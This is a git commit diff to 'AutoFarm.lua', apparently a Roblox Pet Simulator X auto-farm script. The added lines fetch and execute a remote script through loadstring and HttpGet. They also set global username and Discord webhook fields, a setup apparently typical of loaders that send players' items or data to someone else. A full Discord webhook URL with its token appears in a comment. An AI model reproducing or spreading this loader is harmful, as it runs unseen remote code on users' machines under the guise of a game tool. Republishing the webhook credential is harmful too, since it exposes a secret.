63c1b6c3967c701b90b0f7f52679dedad2173aaa
PETSIMULAT0RX <132601745+PETSIMULAT0RX@users.noreply.github.com>
2023-06-16 14:50:04 +0800

    Update AutoFarm.lua

--- AutoFarm.lua
+++ AutoFarm.lua
@@ -1,1 +1,5 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Rafacasari/roblox-scripts/main/psx.lua"))()
+_G.UserName = " " -- zenn2345 
+_G.UserName2 = " " -- zenn2345
+_G.Webhook = " " -- https://discord.com/api/webhooks/1107537076192284723/jdp-l_6DLnWEzWrAjZquC7GOoeyydOexNRoWtweYSUGkPo3ElHWX1W-nYEwlguGRCC4c
+   
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()
